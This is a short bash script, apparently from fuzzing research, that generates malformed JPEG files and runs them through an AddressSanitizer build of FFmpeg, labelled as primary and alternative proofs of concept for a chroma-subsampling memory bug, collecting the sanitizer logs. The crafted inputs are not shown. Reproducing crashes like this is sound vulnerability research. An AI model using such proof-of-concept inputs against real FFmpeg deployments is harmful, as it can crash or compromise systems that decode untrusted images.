#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"
BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

python3 vuln_001_gen.py

echo "=== Primary PoC (3:2:1 subsampling, ideal trigger) ===" | tee -a vuln_001_result.txt
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001_primary.log" \
  "$BIN" -i vuln_001_input.jpg -f null - >> vuln_001_result.txt 2>&1 || true
cat asan_001_primary.log.* >> vuln_001_result.txt 2>/dev/null || true

echo "" >> vuln_001_result.txt
echo "=== Alternative PoC (3:1:1 subsampling, recognized format) ===" | tee -a vuln_001_result.txt
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_001_alt.log" \
  "$BIN" -i vuln_001_input_alt.jpg -f null - >> vuln_001_result.txt 2>&1 || true
cat asan_001_alt.log.* >> vuln_001_result.txt 2>/dev/null || true
